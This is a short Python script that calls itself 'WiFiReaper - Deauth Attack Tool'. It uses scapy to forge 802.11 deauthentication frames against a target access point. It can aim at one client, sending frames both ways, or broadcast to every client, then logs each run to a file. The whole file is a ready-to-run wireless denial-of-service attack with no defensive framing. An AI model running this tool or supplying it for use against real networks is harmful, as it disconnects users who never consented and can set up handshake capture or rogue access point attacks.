import os
from scapy.all import *
from datetime import datetime

def send_deauth_packets(iface, bssid, client=None, count=100):
    print(f"[+] Sending {count} deauth packets on {iface}")
    print(f"[*] Target BSSID (AP): {bssid}")
    if client:
        print(f"[*] Target Client: {client}")
    else:
        print("[*] No client provided — broadcasting deauth to all clients")

    pkt_list = []

    for _ in range(count):
        if client:
            pkt1 = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=client, addr3=bssid)/Dot11Deauth(reason=7)
            pkt_list.extend([pkt1, pkt2])
        else:
            broadcast = "ff:ff:ff:ff:ff:ff"
            pkt = RadioTap()/Dot11(addr1=broadcast, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            pkt_list.append(pkt)

    try:
        sendp(pkt_list, iface=iface, inter=0.1, verbose=0)
        print(f"[✔] Deauth attack complete.")
        os.makedirs("output", exist_ok=True)
        with open("output/deauth_log.txt", "a") as f:
            f.write(f"[{datetime.now()}] Sent {count} deauth(s) on {iface} to BSSID: {bssid}, client: {client or 'broadcast'}\n")

    except KeyboardInterrupt:
        print("\n[-] Attack interrupted.")
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    os.system("clear")
    print("== WiFiReaper - Deauth Attack Tool ==")
    iface = input("Enter monitor mode interface (e.g., wlan0mon): ").strip()
    bssid = input("Enter target BSSID (AP MAC): ").strip()
    client = input("Enter target client MAC (or leave blank for broadcast): ").strip()
    count = input("Number of deauth packets to send [default: 3]: ").strip()

    count = int(count) if count.isdigit() else 3
    client = client if client else None

    send_deauth_packets(iface, bssid, client, count)

if __name__ == "__main__":
    main()
